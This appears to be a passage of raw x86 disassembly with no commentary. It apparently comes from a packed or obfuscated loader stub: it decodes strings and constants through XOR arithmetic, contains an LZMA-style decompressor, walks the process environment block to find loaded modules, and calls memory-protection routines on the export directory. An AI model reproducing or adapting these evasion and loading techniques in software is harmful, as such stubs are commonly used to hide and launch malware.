  412218:	mov    DWORD PTR [ebp-0xc],0x7a050a1d
  41221f:	lea    eax,[ebp-0x10]
  412222:	mov    bl,BYTE PTR [eax]
  412224:	xor    bl,dl
  412226:	sub    bl,0xb
  412229:	mov    BYTE PTR [eax],bl
  41222b:	inc    eax
  41222c:	dec    ecx
  41222d:	jne    0x412222
  41222f:	lea    eax,[ebp-0x10]
  412232:	mov    DWORD PTR [ebp-0xb8],eax
  412238:	lea    eax,[ebp-0xbc]
  41223e:	push   eax
  41223f:	mov    eax,DWORD PTR [ebp+0xc]
  412242:	mov    ebx,0x7510896
  412247:	xor    eax,ebx
  412249:	mov    esi,0x3272dd
  41224e:	add    eax,esi
  412250:	push   eax
  412251:	mov    eax,DWORD PTR [ebp-0x4]
  412254:	add    eax,0x66
  412257:	push   eax
  412258:	mov    eax,DWORD PTR [ebp-0x4]
  41225b:	mov    eax,DWORD PTR [eax+0x198]
  412261:	mov    DWORD PTR [ebp-0xbc],0x1
  41226b:	push   DWORD PTR [eax]
  41226d:	mov    eax,DWORD PTR [ebp+0x10]
  412270:	call   eax
  412272:	mov    ecx,DWORD PTR [ebp+0x8]
  412275:	xor    ecx,ebx
  412277:	add    ecx,esi
  412279:	mov    DWORD PTR [ebp-0x8],eax
  41227c:	cmp    eax,ecx
  41227e:	jne    0x412299
  412280:	mov    eax,ds:0x33730bec
  412285:	or     eax,0x22150bef
  41228a:	mov    ds:0x33730bec,eax
  41228f:	add    eax,0x3372e90f
  412294:	mov    ds:0x33730bec,eax
  412299:	mov    ecx,0x4f85
  41229e:	mov    eax,ecx
  4122a0:	mov    WORD PTR [ebp-0x40],ax
  4122a4:	add    eax,0x3
  4122a7:	mov    edx,eax
  4122a9:	mov    WORD PTR [ebp-0x3e],dx
  4122ad:	lea    edx,[ecx+0xb]
  4122b0:	mov    WORD PTR [ebp-0x3c],dx
  4122b4:	add    edx,0x18
  4122b7:	mov    WORD PTR [ebp-0x3a],dx
  4122bb:	lea    edx,[ecx+0x25]
  4122be:	mov    WORD PTR [ebp-0x38],dx
  4122c2:	add    edx,0x5
  4122c5:	mov    WORD PTR [ebp-0x36],dx
  4122c9:	lea    edx,[ecx+0x1f]
  4122cc:	mov    WORD PTR [ebp-0x34],dx
  4122d0:	mov    WORD PTR [ebp-0x32],cx
  4122d4:	mov    ecx,edi
  4122d6:	mov    WORD PTR [ebp-0x30],cx
  4122da:	lea    ecx,[edx+0x1]
  4122dd:	mov    edx,ecx
  4122df:	mov    WORD PTR [ebp-0x54],dx
  4122e3:	mov    edx,eax
  4122e5:	mov    WORD PTR [ebp-0x52],dx
  4122e9:	mov    edx,0x4e70
  4122ee:	mov    WORD PTR [ebp-0x50],dx
  4122f2:	mov    WORD PTR [ebp-0x4e],ax
  4122f6:	lea    eax,[ecx-0x1b]
  4122f9:	mov    WORD PTR [ebp-0x4c],ax
  4122fd:	add    eax,0x5
  412300:	mov    WORD PTR [ebp-0x4a],ax
  412304:	lea    eax,[ecx-0x21]
  412307:	mov    WORD PTR [ebp-0x48],ax
  41230b:	mov    WORD PTR [ebp-0x46],cx
  41230f:	mov    WORD PTR [ebp-0x44],di
  412313:	mov    eax,DWORD PTR [ebp+0x8]
  412316:	movzx  ecx,WORD PTR [ebp-0x54]
  41231a:	xor    eax,ebx
  41231c:	add    eax,esi
  41231e:	xor    eax,ecx
  412320:	mov    WORD PTR [ebp-0x54],ax
  412324:	mov    eax,DWORD PTR [ebp+0x8]
  412327:	movzx  ecx,WORD PTR [ebp-0x40]
  41232b:	xor    eax,ebx
  41232d:	add    eax,esi
  41232f:	xor    eax,ecx
  412331:	mov    WORD PTR [ebp-0x40],ax
  412335:	xor    eax,eax
  412337:	mov    WORD PTR [ebp-0xd0],ax
  41233e:	mov    WORD PTR [ebp-0xe4],ax
  412345:	mov    edi,DWORD PTR [ebp+0x24]
  412348:	lea    eax,[ebp-0xd0]
  41234e:	lea    edx,[ebp-0x54]
  412351:	mov    DWORD PTR [ebp-0xbc],0x2
  41235b:	mov    DWORD PTR [ebp-0xb8],eax
  412361:	call   0x414b33
  412366:	mov    DWORD PTR [ebp-0xb4],eax
  41236c:	lea    eax,[ebp-0xbc]
  412372:	push   eax
  412373:	mov    eax,DWORD PTR [ebp+0xc]
  412376:	xor    eax,ebx
  412378:	add    eax,esi
  41237a:	push   eax
  41237b:	lea    eax,[ebp-0x78]
  41237e:	push   eax
  41237f:	push   DWORD PTR [ebp-0x8]
  412382:	mov    eax,DWORD PTR [ebp+0x10]
  412385:	call   eax
  412387:	mov    edi,DWORD PTR [ebp+0x24]
  41238a:	lea    eax,[ebp-0xe4]
  412390:	lea    edx,[ebp-0x40]
  412393:	mov    DWORD PTR [ebp-0xb8],eax
  412399:	call   0x414b33
  41239e:	mov    DWORD PTR [ebp-0xb4],eax
  4123a4:	lea    eax,[ebp-0xbc]
  4123aa:	push   eax
  4123ab:	mov    eax,DWORD PTR [ebp+0xc]
  4123ae:	xor    eax,ebx
  4123b0:	add    eax,esi
  4123b2:	push   eax
  4123b3:	lea    eax,[ebp-0x78]
  4123b6:	push   eax
  4123b7:	push   DWORD PTR [ebp-0x8]
  4123ba:	mov    eax,DWORD PTR [ebp+0x10]
  4123bd:	call   eax
  4123bf:	mov    eax,DWORD PTR [ebp+0x14]
  4123c2:	push   DWORD PTR [ebp-0x4]
  4123c5:	push   DWORD PTR [ebp+0x20]
  4123c8:	push   DWORD PTR [ebp+0x1c]
  4123cb:	push   DWORD PTR [ebp+0x18]
  4123ce:	push   DWORD PTR [ebp+0x10]
  4123d1:	push   DWORD PTR [ebp+0x8]
  4123d4:	push   DWORD PTR [ebp+0xc]
  4123d7:	call   0x4133d7
  4123dc:	add    DWORD PTR [ebp-0x4],eax
  4123df:	mov    eax,DWORD PTR [ebp-0x4]
  4123e2:	mov    eax,DWORD PTR [ebp-0x4]
  4123e5:	mov    edi,DWORD PTR [eax+0x190]
  4123eb:	mov    eax,DWORD PTR [ebp-0x4]
  4123ee:	mov    eax,DWORD PTR [eax+0x18c]
  4123f4:	mov    esi,DWORD PTR [eax]
  4123f6:	lea    ecx,[ebp+0x4]
  4123f9:	mov    edx,DWORD PTR [ecx]
  4123fb:	cmp    edx,esi
  4123fd:	jb     0x412414
  4123ff:	mov    eax,DWORD PTR [edi]
  412401:	mov    edi,DWORD PTR [eax+0x3c]
  412404:	mov    edi,DWORD PTR [edi+eax*1+0x50]
  412408:	add    edi,esi
  41240a:	cmp    edx,edi
  41240c:	jae    0x412414
  41240e:	sub    eax,esi
  412410:	add    eax,edx
  412412:	mov    DWORD PTR [ecx],eax
  412414:	pop    edi
  412415:	pop    esi
  412416:	pop    ebx
  412417:	leave  
  412418:	ret    0x20
  41241b:	push   edi
  41241c:	push   esi
  41241d:	push   ebx
  41241e:	push   ebp
  41241f:	mov    ebp,esp
  412421:	mov    eax,DWORD PTR [ebp+0x24]
  412424:	add    DWORD PTR [ebp+0x28],eax
  412427:	push   eax
  412428:	cld    
  412429:	mov    esi,DWORD PTR [ebp+0x18]
  41242c:	add    DWORD PTR [ebp+0x1c],esi
  41242f:	push   esi
  412430:	mov    esi,DWORD PTR [ebp+0x14]
  412433:	lods   eax,DWORD PTR ds:[esi]
  412434:	xchg   edx,eax
  412435:	push   edx
  412436:	mov    cl,BYTE PTR [esi-0x2]
  412439:	or     eax,0xffffffff
  41243c:	shl    eax,cl
  41243e:	not    eax
  412440:	push   eax
  412441:	mov    cl,dh
  412443:	or     eax,0xffffffff
  412446:	shl    eax,cl
  412448:	not    eax
  41244a:	push   eax
  41244b:	add    cl,dl
  41244d:	mov    edi,esi
  41244f:	sub    esp,0xc
  412452:	sub    eax,eax
  412454:	inc    eax
  412455:	push   eax
  412456:	push   eax
  412457:	push   eax
  412458:	push   eax
  412459:	push   eax
  41245a:	push   edi
  41245b:	sub    esi,esi
  41245d:	push   esi
  41245e:	or     ebx,0xffffffff
  412461:	mov    eax,0x300
  412466:	shl    eax,cl
  412468:	lea    ecx,[eax+0x736]
  41246e:	mov    eax,0x4000400
  412473:	shr    ecx,1
  412475:	rep stos DWORD PTR es:[edi],eax
  412477:	push   0x5
  412479:	pop    ecx
  41247a:	call   0x412765
  41247f:	loop   0x41247a
  412481:	lea    esi,[esi]
  412483:	lea    edi,[edi]
  412485:	mov    edi,DWORD PTR [ebp-0x4]
  412488:	mov    eax,DWORD PTR [ebp-0x10]
  41248b:	sub    edi,DWORD PTR [ebp+0x24]
  41248e:	and    eax,edi
  412490:	mov    DWORD PTR [ebp-0x18],eax
  412493:	mov    al,0x0
  412495:	call   0x41277d
  41249a:	jne    0x412535
  4124a0:	mov    cl,BYTE PTR [ebp-0xc]
  4124a3:	and    edi,DWORD PTR [ebp-0x14]
  4124a6:	shl    edi,cl
  4124a8:	sub    cl,0x8
  4124ab:	neg    cl
  4124ad:	shr    esi,cl
  4124af:	pop    eax
  4124b0:	add    edi,esi
  4124b2:	pop    esi
  4124b3:	lea    edi,[edi+edi*2]
  4124b6:	shl    edi,0x8
  4124b9:	cmp    al,0x7
  4124bb:	pop    edx
  4124bc:	lea    ecx,[esi+edi*2+0xe6c]
  4124c3:	push   ecx
  4124c4:	push   esi
  4124c5:	mov    esi,0x100
  4124ca:	push   eax
  4124cb:	mov    al,0x1
  4124cd:	jb     0x412503
  4124cf:	mov    edi,DWORD PTR [ebp-0x4]
  4124d2:	sub    edi,DWORD PTR [ebp-0x24]
  4124d5:	movzx  edi,BYTE PTR [edi]
  4124d8:	mov    ebp,DWORD PTR [ebp-0x34]
  4124db:	shl    edi,1
  4124dd:	mov    ecx,esi
  4124df:	and    esi,edi
  4124e1:	add    ecx,esi
  4124e3:	lea    ebp,[ebp+ecx*2+0x0]
  4124e7:	call   0x41279c
  4124ec:	mov    ecx,eax
  4124ee:	shr    esi,0x8
  4124f1:	and    ecx,0x1
  4124f4:	cmp    esi,ecx
  4124f6:	mov    esi,0x100
  4124fb:	jne    0x41250b
  4124fd:	cmp    eax,esi
  4124ff:	jb     0x4124d8
  412501:	jmp    0x412517
  412503:	mov    ebp,DWORD PTR [ebp-0x34]
  412506:	call   0x41279c
  41250b:	inc    eax
  41250c:	inc    esi
  41250d:	sub    eax,0x1
  412510:	sub    esi,0x1
  412513:	cmp    eax,esi
  412515:	jb     0x412503
  412517:	pop    edx
  412518:	inc    edx
  412519:	cmp    edx,0x5
  41251c:	dec    edx
  41251d:	mov    ecx,edx
  41251f:	jb     0x412530
  412521:	inc    edx
  412522:	cmp    edx,0xb
  412525:	dec    edx
  412526:	mov    cl,0x4
  412528:	dec    cl
  41252a:	jb     0x412530
  41252c:	mov    cl,0x7
  41252e:	dec    cl
  412530:	sub    edx,ecx
  412532:	push   edx
  412533:	jmp    0x412584
  412535:	mov    al,0xc1
  412537:	dec    al
  412539:	call   0x41278d
  41253e:	jne    0x412554
  412540:	pop    eax
  412541:	pop    edi
  412542:	pop    edx
  412543:	pop    ecx
  412544:	pop    edx
  412545:	pop    ecx
  412546:	push   DWORD PTR [esp]
  412549:	push   ecx
  41254a:	push   edx
  41254b:	mov    edx,0x664
  412550:	mov    cl,0x0
  412552:	jmp    0x4125c7
  412554:	mov    al,0xcd
  412556:	dec    al
  412558:	call   0x41278d
  41255d:	jne    0x41258d
  41255f:	mov    al,0xf1
  412561:	dec    al
  412563:	call   0x41277d
  412568:	jne    0x4125bd
  41256a:	pop    eax
  41256b:	cmp    al,0x7
  41256d:	mov    al,0x9
  41256f:	jb     0x412573
  412571:	mov    al,0xb
  412573:	push   eax
  412574:	mov    esi,DWORD PTR [ebp-0x4]
  412577:	sub    esi,DWORD PTR [ebp-0x24]
  41257a:	cmp    esi,DWORD PTR [ebp+0x24]
  41257d:	jb     0x412754
  412583:	lods   al,BYTE PTR ds:[esi]
  412584:	mov    edi,DWORD PTR [ebp-0x4]
  412587:	stos   BYTE PTR es:[edi],al
  412588:	jmp    0x41271b
  41258d:	mov    al,0xd8
  41258f:	call   0x41278d
  412594:	mov    esi,DWORD PTR [ebp-0x28]
  412597:	je     0x4125b4
  412599:	mov    al,0xe4
  41259b:	call   0x41278d
  4125a0:	mov    esi,DWORD PTR [ebp-0x2c]
  4125a3:	je     0x4125ae
  4125a5:	mov    esi,DWORD PTR [ebp-0x30]
  4125a8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4125ab:	mov    DWORD PTR [ebp-0x30],ecx
  4125ae:	mov    ecx,DWORD PTR [ebp-0x28]
  4125b1:	mov    DWORD PTR [ebp-0x2c],ecx
  4125b4:	mov    ecx,DWORD PTR [ebp-0x24]
  4125b7:	mov    DWORD PTR [ebp-0x28],ecx
  4125ba:	mov    DWORD PTR [ebp-0x24],esi
  4125bd:	pop    eax
  4125be:	pop    edi
  4125bf:	pop    ecx
  4125c0:	mov    edx,0xa68
  4125c5:	mov    cl,0x8
  4125c7:	add    edx,edi
  4125c9:	push   edx
  4125ca:	push   edi
  4125cb:	cmp    al,0x7
  4125cd:	mov    al,cl
  4125cf:	jb     0x4125d3
  4125d1:	add    al,0x3
  4125d3:	push   eax
  4125d4:	mov    ebp,DWORD PTR [ebp-0x34]
  4125d7:	call   0x41279a
  4125dc:	jne    0x4125f2
  4125de:	mov    eax,DWORD PTR [ebp-0x18]
  4125e1:	mov    edi,DWORD PTR [ebp-0x34]
  4125e4:	shl    eax,0x3
  4125e7:	sub    ecx,ecx
  4125e9:	push   0x8
  4125eb:	pop    esi
  4125ec:	lea    edi,[edi+eax*2+0x4]
  4125f0:	jmp    0x412627
  4125f2:	mov    ebp,DWORD PTR [ebp-0x34]
  4125f5:	add    ebp,0x2
  4125f8:	call   0x41279a
  4125fd:	jne    0x412617
  4125ff:	mov    eax,DWORD PTR [ebp-0x18]
  412602:	mov    edi,DWORD PTR [ebp-0x34]
  412605:	shl    eax,0x3
  412608:	push   0x8
  41260a:	pop    ecx
  41260b:	push   0x8
  41260d:	pop    esi
  41260e:	lea    edi,[edi+eax*2+0x104]
  412615:	jmp    0x412627
  412617:	mov    edi,0x204
  41261c:	add    edi,DWORD PTR [ebp-0x34]
  41261f:	push   0x10
  412621:	pop    ecx
  412622:	mov    esi,0x100
  412627:	mov    DWORD PTR [ebp-0x1c],ecx
  41262a:	sub    eax,eax
  41262c:	inc    eax
  41262d:	mov    ebp,edi
  41262f:	call   0x41279c
  412634:	mov    ecx,eax
  412636:	sub    ecx,esi
  412638:	jb     0x41262d
  41263a:	add    DWORD PTR [ebp-0x1c],ecx
  41263d:	cmp    DWORD PTR [ebp-0x3c],0x4
  412641:	jae    0x4126f7
  412647:	add    DWORD PTR [ebp-0x3c],0x7
  41264b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41264e:	cmp    ecx,0x4
  412651:	jb     0x412656
  412653:	push   0x3
  412655:	pop    ecx
  412656:	mov    edi,DWORD PTR [ebp-0x38]
  412659:	shl    ecx,0x6
  41265c:	sub    eax,eax
  41265e:	inc    eax
  41265f:	push   0x40
  412661:	pop    esi
  412662:	lea    edi,[edi+ecx*2+0x360]
  412669:	mov    ebp,edi
  41266b:	call   0x41279c
  412670:	mov    ecx,eax
  412672:	sub    ecx,esi
  412674:	jb     0x412669
  412676:	mov    DWORD PTR [ebp-0x18],ecx
  412679:	mov    DWORD PTR [ebp-0x24],ecx
  41267c:	cmp    ecx,0x4
  41267f:	jb     0x4126f4
  412681:	mov    esi,ecx
  412683:	and    DWORD PTR [ebp-0x24],0x1
  412687:	shr    esi,1
  412689:	or     DWORD PTR [ebp-0x24],0x2
  41268d:	dec    esi
  41268e:	cmp    ecx,0xe
  412691:	jae    0x4126ac
  412693:	mov    eax,0x2af
  412698:	sub    eax,ecx
  41269a:	mov    ecx,esi
  41269c:	shl    BYTE PTR [ebp-0x24],cl
  41269f:	add    eax,DWORD PTR [ebp-0x24]
  4126a2:	shl    eax,1
  4126a4:	add    eax,DWORD PTR [ebp-0x38]
  4126a7:	mov    DWORD PTR [ebp-0x34],eax
  4126aa:	jmp    0x4126d9
  4126ac:	sub    esi,0x4
  4126af:	call   0x412759
  4126b4:	shr    ebx,1
  4126b6:	shl    DWORD PTR [ebp-0x24],1
  4126b9:	cmp    DWORD PTR [ebp-0x20],ebx
  4126bc:	jb     0x4126c4
  4126be:	inc    DWORD PTR [ebp-0x24]
  4126c1:	sub    DWORD PTR [ebp-0x20],ebx
  4126c4:	dec    esi
  4126c5:	jne    0x4126af
  4126c7:	mov    eax,0x644
  4126cc:	add    eax,DWORD PTR [ebp-0x38]
  4126cf:	mov    DWORD PTR [ebp-0x34],eax
  4126d2:	shl    DWORD PTR [ebp-0x24],0x4
  4126d6:	push   0x4
  4126d8:	pop    esi
  4126d9:	sub    edi,edi
  4126db:	inc    edi
  4126dc:	mov    eax,edi
  4126de:	mov    ebp,DWORD PTR [ebp-0x34]
  4126e1:	call   0x41279c
  4126e6:	test   al,0x1
  4126e8:	je     0x4126ed
  4126ea:	or     DWORD PTR [ebp-0x24],edi
  4126ed:	shl    edi,1
  4126ef:	dec    esi
  4126f0:	jne    0x4126de
  4126f2:	jmp    0x4126f4
  4126f4:	inc    DWORD PTR [ebp-0x24]
  4126f7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4126fa:	add    ecx,0x2
  4126fd:	mov    edi,DWORD PTR [ebp-0x4]
  412700:	mov    eax,edi
  412702:	sub    eax,DWORD PTR [ebp+0x24]
  412705:	cmp    DWORD PTR [ebp-0x24],eax
  412708:	ja     0x412754
  41270a:	mov    esi,edi
  41270c:	sub    esi,DWORD PTR [ebp-0x24]
  41270f:	mov    edx,DWORD PTR [ebp+0x28]
  412712:	lods   al,BYTE PTR ds:[esi]
  412713:	stos   BYTE PTR es:[edi],al
  412714:	cmp    edi,edx
  412716:	jae    0x41271b
  412718:	dec    ecx
  412719:	jne    0x412712
  41271b:	mov    DWORD PTR [ebp-0x4],edi
  41271e:	movzx  esi,al
  412721:	cmp    edi,DWORD PTR [ebp+0x28]
  412724:	jb     0x412485
  41272a:	call   0x412759
  41272f:	sub    eax,eax
  412731:	lea    ebp,[esp+0x3c]
  412735:	mov    edx,DWORD PTR [ebp+0x20]
  412738:	mov    esi,DWORD PTR [ebp-0x8]
  41273b:	sub    esi,DWORD PTR [ebp+0x18]
  41273e:	mov    DWORD PTR [edx],esi
  412740:	mov    edx,DWORD PTR [ebp+0x2c]
  412743:	mov    edi,DWORD PTR [ebp-0x4]
  412746:	sub    edi,DWORD PTR [ebp+0x24]
  412749:	mov    DWORD PTR [edx],edi
  41274b:	leave  
  41274c:	pop    ebx
  41274d:	pop    esi
  41274e:	pop    edi
  41274f:	ret    0x1c
  412752:	pop    esi
  412753:	pop    eax
  412754:	sub    eax,eax
  412756:	inc    eax
  412757:	jmp    0x412731
  412759:	cmp    ebx,0x1000000
  41275f:	jb     0x412762
  412761:	ret    
  412762:	shl    ebx,0x8
  412765:	push   esi
  412766:	mov    esi,DWORD PTR [ebp-0x8]
  412769:	cmp    esi,DWORD PTR [ebp+0x1c]
  41276c:	jae    0x412752
  41276e:	mov    eax,DWORD PTR [ebp-0x20]
  412771:	shl    eax,0x8
  412774:	lods   al,BYTE PTR ds:[esi]
  412775:	mov    DWORD PTR [ebp-0x20],eax
  412778:	mov    DWORD PTR [ebp-0x8],esi
  41277b:	pop    esi
  41277c:	ret    
  41277d:	mov    ecx,DWORD PTR [ebp-0x3c]
  412780:	movzx  eax,al
  412783:	shl    ecx,0x4
  412786:	add    eax,DWORD PTR [ebp-0x18]
  412789:	add    eax,ecx
  41278b:	jmp    0x412793
  41278d:	movzx  eax,al
  412790:	add    eax,DWORD PTR [ebp-0x3c]
  412793:	mov    ebp,DWORD PTR [ebp-0x38]
  412796:	lea    ebp,[ebp+eax*2+0x0]
  41279a:	sub    eax,eax
  41279c:	lea    ebp,[ebp+eax*2+0x0]
  4127a0:	cmp    ebx,0x1000000
  4127a6:	jae    0x4127c4
  4127a8:	mov    ecx,DWORD PTR [esp+0x38]
  4127ac:	shl    DWORD PTR [esp+0x20],0x8
  4127b1:	cmp    ecx,DWORD PTR [esp+0x5c]
  4127b5:	jae    0x412753
  4127b7:	mov    dl,BYTE PTR [ecx]
  4127b9:	inc    DWORD PTR [esp+0x38]
  4127bd:	shl    ebx,0x8
  4127c0:	mov    BYTE PTR [esp+0x20],dl
  4127c4:	mov    ecx,ebx
  4127c6:	movzx  edx,WORD PTR [ebp+0x0]
  4127ca:	shr    ecx,0xb
  4127cd:	imul   ecx,edx
  4127d0:	cmp    DWORD PTR [esp+0x20],ecx
  4127d4:	jae    0x4127ed
  4127d6:	mov    ebx,ecx
  4127d8:	mov    ecx,0x800
  4127dd:	sub    ecx,edx
  4127df:	shr    ecx,0x5
  4127e2:	add    WORD PTR [ebp+0x0],cx
  4127e6:	add    eax,eax
  4127e8:	lea    ebp,[esp+0x40]
  4127ec:	ret    
  4127ed:	shr    edx,0x5
  4127f0:	sub    DWORD PTR [esp+0x20],ecx
  4127f4:	sub    ebx,ecx
  4127f6:	sub    WORD PTR [ebp+0x0],dx
  4127fa:	add    eax,eax
  4127fc:	add    eax,0x1
  4127ff:	lea    ebp,[esp+0x40]
  412803:	ret    
  412804:	push   ebp
  412805:	mov    ebp,esp
  412807:	sub    esp,0xec
  41280d:	push   ebx
  41280e:	push   esi
  41280f:	push   edi
  412810:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  412817:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  41281e:	mov    eax,DWORD PTR [ebp+0x8]
  412821:	mov    DWORD PTR [ebp+0x8],eax
  412824:	mov    ecx,DWORD PTR [ebp-0x8]
  412827:	mov    ebx,0x7510896
  41282c:	xor    ecx,ebx
  41282e:	mov    eax,0x3272dd
  412833:	add    ecx,eax
  412835:	mov    DWORD PTR [ebp-0x20],ecx
  412838:	mov    ecx,DWORD PTR [ebp-0x8]
  41283b:	xor    ecx,ebx
  41283d:	add    ecx,eax
  41283f:	mov    DWORD PTR [ebp-0x30],ecx
  412842:	mov    ecx,DWORD PTR [ebp-0x8]
  412845:	xor    ecx,ebx
  412847:	add    ecx,eax
  412849:	mov    DWORD PTR [ebp-0x2c],ecx
  41284c:	mov    ecx,DWORD PTR [ebp-0x8]
  41284f:	xor    ecx,ebx
  412851:	add    ecx,eax
  412853:	mov    DWORD PTR [ebp-0xa0],ecx
  412859:	mov    DWORD PTR [ebp-0x48],0xf89f05b5
  412860:	mov    DWORD PTR [ebp-0x2c],0xf89cb5b5
  412867:	mov    DWORD PTR [ebp-0x3c],0xf89c85b1
  41286e:	push   0x24
  412870:	pop    ecx
  412871:	mov    DWORD PTR [ebp-0x28],ecx
  412874:	mov    DWORD PTR [ebp-0x28],ecx
  412877:	push   0x64
  412879:	pop    ecx
  41287a:	mov    DWORD PTR [ebp-0x28],ecx
  41287d:	mov    DWORD PTR [ebp-0x28],ecx
  412880:	mov    DWORD PTR [ebp-0x28],0x4c
  412887:	mov    DWORD PTR [ebp-0x28],0x42
  41288e:	mov    ecx,DWORD PTR [ebp-0x8]
  412891:	xor    ecx,ebx
  412893:	add    ecx,eax
  412895:	mov    DWORD PTR [ebp-0x28],ecx
  412898:	mov    ecx,DWORD PTR [ebp-0x8]
  41289b:	xor    ecx,ebx
  41289d:	add    ecx,eax
  41289f:	mov    DWORD PTR [ebp-0x28],ecx
  4128a2:	mov    DWORD PTR [ebp-0x24],0x256
  4128a9:	mov    DWORD PTR [ebp-0x1c],0x34
  4128b0:	mov    DWORD PTR [ebp-0xc],0x78
  4128b7:	lea    edi,[ebp-0xcc]
  4128bd:	lea    esi,[ebp-0xec]
  4128c3:	call   0x413346
  4128c8:	dec    DWORD PTR [ebp-0xc]
  4128cb:	jne    0x4128b7
  4128cd:	dec    DWORD PTR [ebp-0x1c]
  4128d0:	jne    0x4128b0
  4128d2:	dec    DWORD PTR [ebp-0x24]
  4128d5:	jne    0x4128a9
  4128d7:	mov    DWORD PTR [ebp-0x1c],0x400c
  4128de:	mov    eax,DWORD PTR [ebp-0x8]
  4128e1:	xor    eax,ebx
  4128e3:	mov    esi,0x3272dd
  4128e8:	add    eax,esi
  4128ea:	mov    DWORD PTR [ebp-0x14],eax
  4128ed:	mov    eax,DWORD PTR [ebp-0x8]
  4128f0:	and    DWORD PTR [ebp-0x8c],0x0
  4128f7:	xor    eax,ebx
  4128f9:	add    eax,esi
  4128fb:	mov    DWORD PTR [ebp-0x24],eax
  4128fe:	mov    eax,fs:0x18
  412904:	mov    DWORD PTR [ebp-0x8c],eax
  41290a:	mov    eax,DWORD PTR [eax+0x30]
  41290d:	mov    DWORD PTR [ebp-0x90],eax
  412913:	mov    eax,DWORD PTR [eax+0xc]
  412916:	mov    DWORD PTR [ebp-0x9c],eax
  41291c:	mov    eax,DWORD PTR [ebp+0x8]
  41291f:	lea    ecx,[ebp-0x8c]
  412925:	mov    DWORD PTR [eax+0x1a0],ecx
  41292b:	mov    eax,DWORD PTR [ebp+0x8]
  41292e:	lea    ecx,[ebp-0x90]
  412934:	mov    DWORD PTR [eax+0x1a4],ecx
  41293a:	mov    eax,DWORD PTR [ebp+0x8]
  41293d:	push   DWORD PTR [ebp+0x8]
  412940:	lea    ecx,[ebp-0x9c]
  412946:	mov    DWORD PTR [eax+0x1a8],ecx
  41294c:	call   0x414b04
  412951:	mov    ecx,DWORD PTR [ebp-0x8]
  412954:	xor    ecx,ebx
  412956:	add    ecx,esi
  412958:	cmp    ecx,eax
  41295a:	je     0x412c2e
  412960:	mov    eax,DWORD PTR [ebp+0x8]
  412963:	mov    eax,DWORD PTR [eax+0x194]
  412969:	mov    ecx,DWORD PTR [eax]
  41296b:	mov    eax,DWORD PTR [ebp+0x8]
  41296e:	mov    eax,DWORD PTR [eax+0x194]
  412974:	mov    eax,DWORD PTR [eax]
  412976:	add    eax,DWORD PTR [ecx+0x3c]
  412979:	mov    ecx,DWORD PTR [ebp+0x8]
  41297c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  412982:	lea    edx,[ebp-0xac]
  412988:	push   edx
  412989:	mov    edx,DWORD PTR [ebp+0x8]
  41298c:	mov    edx,DWORD PTR [edx+0x18c]
  412992:	mov    edx,DWORD PTR [edx]
  412994:	add    edx,DWORD PTR [eax+0x88]
  41299a:	push   0x4
  41299c:	push   DWORD PTR [eax+0x8c]
  4129a2:	push   edx
  4129a3:	call   DWORD PTR [ecx+0x1c]
  4129a6:	push   DWORD PTR [ebp+0x8]
  4129a9:	mov    edi,DWORD PTR [ebp+0x8]
  4129ac:	mov    eax,DWORD PTR [ebp+0x8]
  4129af:	mov    edx,DWORD PTR [eax+0x1b8]
  4129b5:	mov    DWORD PTR [ebp-0x5c],0xc0e0f06
  4129bc:	mov    DWORD PTR [ebp-0x58],0x50a091f
  4129c3:	mov    WORD PTR [ebp-0x54],0x7a3d
  4129c9:	mov    DWORD PTR [ebp-0x70],0x23f0f25
  4129d0:	mov    DWORD PTR [ebp-0x6c],0x63d0c1d
  4129d7:	mov    DWORD PTR [ebp-0x68],0x281d020a
  4129de:	mov    DWORD PTR [ebp-0x64],0xc0109f1
  4129e5:	mov    DWORD PTR [ebp-0x60],0x7a3d1f05
  4129ec:	mov    DWORD PTR [ebp-0x84],0x23f0f25
  4129f6:	mov    DWORD PTR [ebp-0x80],0x63d0c1d
  4129fd:	mov    DWORD PTR [ebp-0x7c],0x281d020a
  412a04:	mov    DWORD PTR [ebp-0x78],0xc0109f1
  412a0b:	mov    DWORD PTR [ebp-0x74],0x7a131f05
  412a12:	call   0x414b33
  412a17:	push   eax
  412a18:	mov    eax,DWORD PTR [ebp+0x8]
  412a1b:	mov    eax,DWORD PTR [eax+0x1a8]
  412a21:	push   DWORD PTR [eax]
  412a23:	call   0x4147d5
  412a28:	test   eax,eax
  412a2a:	jne    0x412a7c
  412a2c:	mov    eax,DWORD PTR [ebp+0x8]
  412a2f:	mov    eax,DWORD PTR [eax+0x1d8]
  412a35:	mov    edi,DWORD PTR [ebp+0x8]
  412a38:	add    eax,0x4
  412a3b:	mov    DWORD PTR [ebp-0x18],eax
  412a3e:	mov    eax,DWORD PTR [ebp+0x8]
  412a41:	mov    edx,DWORD PTR [eax+0x1b8]
  412a47:	call   0x414b33
  412a4c:	push   eax
  412a4d:	mov    eax,DWORD PTR [ebp-0x18]
  412a50:	call   DWORD PTR [eax]
  412a52:	test   eax,eax
  412a54:	jne    0x412a7c
  412a56:	mov    eax,DWORD PTR [ebp+0x8]
  412a59:	mov    eax,DWORD PTR [eax+0x1d8]
  412a5f:	mov    edi,DWORD PTR [ebp+0x8]
  412a62:	add    eax,0x10
  412a65:	mov    DWORD PTR [ebp-0x18],eax
  412a68:	mov    eax,DWORD PTR [ebp+0x8]
  412a6b:	mov    edx,DWORD PTR [eax+0x1b8]
  412a71:	call   0x414b33
  412a76:	push   eax
  412a77:	mov    eax,DWORD PTR [ebp-0x18]
  412a7a:	call   DWORD PTR [eax]
  412a7c:	mov    eax,DWORD PTR [ebp-0x8]
  412a7f:	mov    ecx,DWORD PTR [ebp-0x1c]
  412a82:	xor    eax,ebx
  412a84:	add    eax,esi
  412a86:	cmp    eax,ecx
  412a88:	je     0x412c07
  412a8e:	mov    eax,DWORD PTR [ebp-0x34]
  412a91:	xor    eax,ebx
  412a93:	mov    ecx,0xffcd8d23
  412a98:	sub    ecx,eax
  412a9a:	add    ecx,DWORD PTR [ebp-0x1c]
  412a9d:	mov    eax,DWORD PTR [ebp-0x14]
  412aa0:	cmp    eax,ecx
  412aa2:	ja     0x412c07
  412aa8:	mov    DWORD PTR [ebp-0x4],0x0
  412aaf:	push   DWORD PTR [ebp+0x8]
  412ab2:	mov    edi,DWORD PTR [ebp+0x8]
  412ab5:	mov    eax,DWORD PTR [ebp+0x8]
